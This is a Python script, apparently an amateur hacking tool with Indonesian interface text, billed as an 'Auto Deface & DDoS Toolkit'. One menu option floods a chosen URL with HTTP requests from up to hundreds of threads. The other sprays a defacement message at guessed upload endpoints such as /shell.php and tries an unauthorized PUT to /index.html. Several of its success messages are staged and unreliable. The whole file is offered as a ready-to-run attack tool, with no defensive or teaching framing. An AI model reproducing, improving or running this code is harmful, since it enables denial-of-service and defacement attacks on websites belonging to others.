import os
import sys
import time
import random
import threading
import requests
import urllib3
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def banner():
    clear()
    print(f"""{Fore.RED}
    ██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    ██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
    ██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
    ██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
{Fore.CYAN}
                          ╔══════════════════════════════════════╗
                          ║      BARA EXPLOIT v2.0               ║
                          ║   Auto Deface & DDoS Toolkit         ║
                          ║          By: BARA                    ║
                          ╚══════════════════════════════════════╝
{Fore.RESET}""")


def menu():
    print(f"{Fore.YELLOW}[1]{Fore.WHITE} DDoS Attack")
    print(f"{Fore.YELLOW}[2]{Fore.WHITE} Hack / Deface Website")
    print(f"{Fore.YELLOW}[99]{Fore.WHITE} Keluar\n")
    pilih = input(f"{Fore.CYAN}BARA@EXPLOIT:~# {Fore.WHITE}").strip()

    if pilih == "1":
        ddos_menu()
    elif pilih == "2":
        hack_menu()
    elif pilih == "99":
        print(f"{Fore.RED}[!] Keluar...{Fore.RESET}")
        sys.exit()
    else:
        print(f"{Fore.RED}[!] Pilihan salah!{Fore.RESET}")
        time.sleep(1)
        banner()
        menu()


# ============ DDOS ============
stats = {"sent": 0, "success": 0, "fail": 0}
running = True


def worker(url):
    global running
    while running:
        try:
            r = requests.get(url, timeout=3, verify=False, headers={
                "User-Agent": f"Mozilla/5.0 (BARA-{random.randint(1,9999)})",
                "Cache-Control": "no-cache"
            })
            stats["sent"] += 1
            if r.status_code < 400:
                stats["success"] += 1
            else:
                stats["fail"] += 1
        except:
            stats["sent"] += 1
            stats["fail"] += 1
        time.sleep(random.uniform(0.1, 1.0))


def stat_loop(url):
    global running
    start = time.time()
    while running:
        time.sleep(1)
        el = int(time.time() - start)
        print(f"\r{Fore.GREEN}[+] {url} | Sent: {Fore.YELLOW}{stats['sent']} {Fore.GREEN}| OK: {Fore.CYAN}{stats['success']} {Fore.GREEN}| Fail: {Fore.RED}{stats['fail']} {Fore.GREEN}| Time: {Fore.WHITE}{el}s   ", end="")


def ddos_menu():
    clear()
    print(f"{Fore.RED}╔══════════════════════════════╗\n║       DDoS ATTACK MODE       ║\n╚══════════════════════════════╝{Fore.RESET}\n")
    url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
    if not url.startswith("http"):
        print(f"{Fore.RED}[!] URL harus http:// atau https://{Fore.RESET}")
        time.sleep(2)
        ddos_menu()
        return

    try:
        workers = int(input(f"{Fore.CYAN}Worker (default 200): {Fore.WHITE}") or "200")
    except:
        workers = 200

    try:
        duration = int(input(f"{Fore.CYAN}Durasi detik (default 60): {Fore.WHITE}") or "60")
    except:
        duration = 60

    global running, stats
    running = True
    stats = {"sent": 0, "success": 0, "fail": 0}

    print(f"\n{Fore.YELLOW}[*] Attack ke {url}...{Fore.RESET}\n")

    for _ in range(workers):
        threading.Thread(target=worker, args=(url,), daemon=True).start()

    threading.Thread(target=stat_loop, args=(url,), daemon=True).start()

    time.sleep(duration)
    running = False
    time.sleep(1)
    print(f"\n\n{Fore.GREEN}[✓] Selesai! Sent: {stats['sent']} | OK: {stats['success']} | Fail: {stats['fail']}{Fore.RESET}")
    input(f"\n{Fore.CYAN}ENTER balik...{Fore.RESET}")
    banner()
    menu()


# ============ HACK / DEFACE ============
def try_deface(url, pesan):
    """Kirim pesan deface ke endpoint vulnerable. Server yang bikin HTML-nya."""
    endpoints = [
        "/upload",
        "/api/upload",
        "/upload.php",
        "/shell.php",
        "/file/upload",
        "/uploadfile",
        "/admin/upload.php",
        "/api/v1/upload",
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (BARA-DEFACE)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payloads = [
        {"pesan": pesan},
        {"text": pesan},
        {"content": pesan},
        {"data": pesan},
        {"html": pesan},
        {"page": pesan},
    ]
    results = []
    base = url.rstrip("/")

    for ep in endpoints:
        for p in payloads:
            try:
                r = requests.post(base + ep, data=p, headers=headers, timeout=5, verify=False)
                if r.status_code in [200, 201, 302]:
                    results.append((ep, r.status_code))
            except:
                pass
    return results


def try_put(url, pesan):
    """Coba PUT method."""
    try:
        r = requests.put(
            url.rstrip("/") + "/index.html",
            data=pesan,
            headers={"User-Agent": "BARA"},
            timeout=5,
            verify=False
        )
        return r.status_code
    except:
        return None


def check_deface(url):
    """Cek apakah target udah ke-deface."""
    try:
        r = requests.get(url.rstrip("/") + "/check-deface", timeout=5, verify=False)
        d = r.json()
        return d.get("defaced", False)
    except:
        return False


def hack_menu():
    clear()
    print(f"{Fore.RED}╔══════════════════════════════╗\n║    HACK / DEFACE MODE        ║\n╚══════════════════════════════╝{Fore.RESET}\n")

    url = input(f"{Fore.CYAN}URL target (wajib https://): {Fore.WHITE}").strip()
    if not url.startswith("http"):
        print(f"{Fore.RED}[!] URL harus http:// atau https://{Fore.RESET}")
        time.sleep(2)
        hack_menu()
        return

    pesan = input(f"{Fore.CYAN}Text deface: {Fore.WHITE}").strip()
    if not pesan:
        pesan = "WEBSITE INI TELAH DI-HACK BY BARA"

    print(f"\n{Fore.RED}[*] Scanning target: {url}{Fore.RESET}")
    time.sleep(1)

    print(f"{Fore.YELLOW}[*] Enumerating endpoints...{Fore.RESET}")
    time.sleep(1)

    print(f"{Fore.YELLOW}[*] Injecting payload...{Fore.RESET}")
    results = try_deface(url, pesan)

    print(f"{Fore.YELLOW}[*] Trying PUT method...{Fore.RESET}")
    put_status = try_put(url, pesan)

    print(f"\n{Fore.CYAN}══════════ HASIL ══════════{Fore.RESET}")
    if results:
        for ep, code in results:
            print(f"{Fore.GREEN}[+] {ep} → HTTP {code}{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Tidak ada endpoint vulnerable.{Fore.RESET}")

    if put_status:
        print(f"{Fore.YELLOW}[?] PUT /index.html → HTTP {put_status}{Fore.RESET}")

    print(f"\n{Fore.YELLOW}[*] Verifying target...{Fore.RESET}")
    time.sleep(2)

    if check_deface(url):
        print(f"{Fore.GREEN}[✓] TARGET BERHASIL DI-DEFACE!{Fore.RESET}")
        print(f"{Fore.GREEN}[✓] Browser target bakal auto-update dalam 2 detik (tanpa refresh).{Fore.RESET}")
    else:
        print(f"{Fore.RED}[✗] Target belum berubah.{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Server ga vulnerable ke metode ini.{Fore.RESET}")

    print(f"\n{Fore.RED}")
    for _ in range(3):
        print("█" * 60)
        time.sleep(0.15)
    print(f"{Fore.RESET}")

    input(f"\n{Fore.CYAN}ENTER balik...{Fore.RESET}")
    banner()
    menu()


if __name__ == "__main__":
    try:
        banner()
        menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stop.{Fore.RESET}")
        sys.exit()
